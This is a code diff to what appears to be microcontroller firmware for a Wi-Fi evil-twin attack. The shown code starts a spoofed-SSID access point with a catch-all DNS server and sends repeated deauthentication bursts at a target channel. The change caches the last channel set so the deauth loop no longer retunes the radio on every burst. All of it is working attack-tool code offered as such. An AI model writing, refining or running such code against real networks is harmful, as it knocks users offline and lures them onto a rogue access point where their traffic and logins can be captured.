@@ -55,6 +55,7 @@ static char     apBSSID[MAX_SCAN][18];   /* "XX:XX:XX:XX:XX:XX"         */
 static int      apCh[MAX_SCAN];
 static int      apRSSI[MAX_SCAN];
 static unsigned long lastDeauthMs;
+static uint8_t  lastSetChannel = 0;
 
 /* ================================================================== */
 /*  Hex helpers – avoids %X / %x portability traps on newlib-nano      */
@@ -757,8 +758,7 @@ static void enterAttackMode(void)
         spoofedSSID += " ";
     }
     WiFi.softAP(spoofedSSID.c_str(), NULL, targetChannel);
-
-    wifi_set_channel(targetChannel);
+    lastSetChannel = targetChannel;
 
     dnsServer.start(DNS_PORT, "*", apIP);
 
@@ -802,9 +802,12 @@ void loop(void)
     if (attacking) {
         unsigned long now = millis();
         if (now - lastDeauthMs >= 200) {
-            lastDeauthMs = now;
-            wifi_set_channel(targetChannel);
+            if (lastSetChannel != targetChannel) {
+                wifi_set_channel(targetChannel);
+                lastSetChannel = targetChannel;
+            }
             sendDeauthBurst();
+            lastDeauthMs = now;
         }
         
         if (attackTimeoutMins > 0 && (now - attackStartMs >= (unsigned long)attackTimeoutMins * 60000)) {
